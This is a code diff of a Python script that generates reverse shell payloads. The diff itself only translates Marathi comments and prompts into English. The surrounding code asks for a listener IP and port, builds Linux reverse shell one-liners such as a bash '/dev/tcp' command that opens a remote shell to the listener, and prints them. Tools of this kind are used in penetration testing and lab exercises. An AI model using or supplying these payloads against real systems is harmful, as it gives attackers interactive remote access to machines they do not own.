@@ -6,15 +6,15 @@ def generate_reverse_shells():
     print("        REVERSE SHELL PAYLOAD GENERATOR           ")
     print("==================================================")
     
-    # युझरकडून IP आणि Port इनपुट घेणे
-    ip = input("[+] तुमचा Listener IP टाका (उदा. 10.10.10.14): ")
-    port = input("[+] तुमचा Listener Port टाका (उदा. 4444): ")
+    # Taking Listener IP and Port from the user
+    ip = input("[+] Enter your Listener IP (e.g., 10.10.10.14): ")
+    port = input("[+] Enter your Listener Port (e.g., 4444): ")
     
     if not ip or not port:
-        print("[-] कृपया IP आणि Port दोन्ही अचूक टाका!")
+        print("[-] Error: IP and Port cannot be empty!")
         return
 
-    # वेगवेगळ्या प्रकारचे लिनक्स रिव्हर्स शेल पेलोड्स
+    # Different types of Linux reverse shell payloads
     payloads = {
         "Bash (Standard)": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
         
@@ -29,7 +29,7 @@ def generate_reverse_shells():
     
     print("\n" + "="*20 + " GENERATED PAYLOADS " + "="*20)
     
-    # सर्व पेलोड्स स्क्रीनवर प्रिंट करणे (हिरव्या रंगात)
+    # Printing all payloads on the screen (in green color text)
     for name, payload in payloads.items():
         print(f"\n[*] {name} :")
         print(f"\033[92m{payload}\033[0m")
